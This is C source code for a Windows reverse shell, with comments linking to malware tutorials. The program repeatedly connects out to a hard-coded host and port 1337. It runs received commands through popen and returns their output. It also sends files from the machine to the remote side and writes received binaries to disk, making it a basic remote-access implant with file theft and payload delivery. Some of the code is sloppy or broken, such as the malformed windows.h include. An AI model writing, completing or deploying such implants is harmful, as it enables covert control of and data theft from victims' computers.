// This is a mess, stderr should be properly redirected with manual pipes, here some links to follow
// https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/
// https://sinister.ly/Thread-Tutorial-Source-Code-Tutorial-Simple-Reverse-Shell-in-C
// https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c

#pragma comment(lib, "ws2_32.lib")
#include <winsock2.h>
#include <windows.h.>
#include <stdio.h>
#include <ws2tcpip.h>
#include <stdlib.h>

void null_terminate(char *buff)
{
    if ( (strlen(buff) == 1) && (strlen(buff)-1 == '\0') )
    {
        snprintf(buff, strlen("Nothing")+1,"Nothing"); //debugging
    }
    if (buff[strlen(buff)-1] == '\n')
    {
        buff[strlen(buff)-1] = '\0';
    }
}

void go_sleep(SOCKET sock, void* addrinfo_struct)
{
    int err;
    printf("Going latent...\n");
    closesocket(sock);
    freeaddrinfo(addrinfo_struct);
    WSACleanup();
    sleep(5);
}

int get_bin(SOCKET sock, char *buff)
{
    FILE *fp;
    int nbytes, i;
    char filepath[PATH_MAX];
    char send_buff[BUFSIZ];
    char *filebuff, *token;
    size_t size;
    token = strtok(buff, " ");
    snprintf(filepath, sizeof(filepath), "%s", strtok(NULL, " "));
    for (i = 0; i < strlen(filepath); i++)
    {
        if (filepath[i] == '/')
        {
            filepath[i] = '\\';
        }
    }
    fp = fopen(filepath, "rb");
    if (!fp)
    {
        printf("%s could not be opened\n", filepath);
        return -1;
    }
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    filebuff = malloc(sizeof(char) * size);

    fread(filebuff, 1, size, fp);
    snprintf(send_buff, sizeof(send_buff), "%d", size);
    printf("File %s with size %d\n", filepath, size);
    for (i = 0; i < size; i++)
    {
        printf("%c", filebuff[i]);
    }
    printf("\n");
    nbytes = send(sock, filebuff, size, 0);
    if (nbytes <= 0)
    {
        perror("Error sending size");
    }
    fclose(fp);
}

int put_bin(SOCKET sock, char *buff)
{
    FILE *fd;
    char *token, filename[_MAX_FNAME], exec_filename[_MAX_FNAME];
    int nbytes;
    size_t size;
    strtok(buff, " ");
    sprintf(filename,"%s", strtok(NULL," "));
    size = atoi(strtok(NULL, " "));
    printf("File %s with size %d\n", filename, size);
    sprintf(exec_filename, "%s.exe", filename);
    char file_content[size];
    nbytes = send(sock, "Ready", strlen("Ready"), 0);
    if (nbytes <= 0)
    {
        perror("Error at sending ready signal");
    }
    else
    {
        nbytes = recv(sock, file_content, sizeof(file_content), 0);
        if (nbytes <= 0)
        {
            perror("Error at receiving file");
        }
        printf("File buff received\n");
        fd = fopen(filename, "wb");
        fwrite(file_content, sizeof(file_content),1,fd);
        fclose(fd);
    }
}

int parse_command(char *buff)
{
    char holder[strlen(buff)+1];
    strcpy(holder, buff);
    char *token;
    token = strtok(holder, " ");
    if (!strcmp(holder, "exit")) return 0;
    else if (!strcmp(token, "put")) return 1;
    else if (!strcmp(token, "get")) return 2;
    return 36;
}

int execute(SOCKET fd, char *cmd)
{
    char response[81920];
    int nbytes, nread;
    FILE *pipe = popen(cmd, "r");
    if (!pipe)
    {
        nbytes = send(fd, "Handhshake", strlen("Handshake"), 0);
        if (nbytes < 0)
        {
            perror("At send: ");
        }
    }
    do
    {
        nread = fread(response, 1, sizeof(response), pipe);
        if (nread <= 0) break;
        printf("%d\n", nread);
        char *buffer = response;
        while (nread > 0)
        {
            nbytes = send(fd, response, nread, 0);
            if (nbytes <= 0)
            {
                perror("At send: ");
                break;
            }  
            nread -= nbytes;
            //buffer += nbytes;
        }
    } while (!feof(pipe));
    return 0;
}

int main()
{
    char szSystemDir[MAX_PATH + 1];
    char recv_buf[8192];
    char power_buf[2000];
    int nbytes, parse_rv;
    while(1)
    {
        WSADATA wsadata;
        if (WSAStartup(MAKEWORD(2,2), &wsadata))
        {
            printf("WSA failed\n");
            return 1;
        }

        struct addrinfo *res = NULL;
        struct addrinfo *first_addr = NULL;
        struct addrinfo addr_info;

        memset(&addr_info,0,sizeof(addr_info));
        addr_info.ai_family = AF_INET;
        addr_info.ai_socktype = SOCK_STREAM;
        addr_info.ai_protocol = IPPROTO_TCP;
        
        int err;
        if (err = getaddrinfo("0.0.0.0", "1337",&addr_info, &res))
        {
            printf("Obtaining address information failed, error: %d\n",err);
            sleep(5);
            continue;
        }

        first_addr = res;

        SOCKET cli_sock;
        if ((cli_sock = WSASocket(first_addr->ai_family, first_addr->ai_socktype, first_addr->ai_protocol, NULL, 0,0)) == INVALID_SOCKET)
        {
            printf("Error on socket creation\n");
            go_sleep(cli_sock, res);
            continue;
        }

        
        if ((err = connect(cli_sock, first_addr->ai_addr, (int)first_addr->ai_addrlen)) == SOCKET_ERROR)
        {
            printf("Connection failed, error: %d\n",err);
            go_sleep(cli_sock, res);
            continue;
        }
        
        printf("Connected\n");

        while (1)
        {
            memset(recv_buf, 0, sizeof(recv_buf));
            do    
            {
                nbytes = recv(cli_sock, recv_buf, sizeof(recv_buf)-1, 0);
                if (nbytes == SOCKET_ERROR)
                {
                    perror("At recv: ");
                    break;
                }
                printf("Received buffer: %s\n",recv_buf);
            } while (nbytes && nbytes > (sizeof(recv_buf)-1));

            parse_rv = parse_command(recv_buf);
            if (!parse_rv)
            {
                printf("Closing connection\n");
                break;
            }
            else if (parse_rv == 1)
            {
                put_bin(cli_sock, recv_buf);
            }
            else if (parse_rv == 2)
            {
                get_bin(cli_sock, recv_buf);
            }
            else if (parse_rv == 36)
            {
                strcat(recv_buf, " 2>&1 0>&1");
                null_terminate(recv_buf);
                execute(cli_sock, recv_buf);
            }
        }
        go_sleep(cli_sock, res);
    }
    WSACleanup();
    return 0;
}

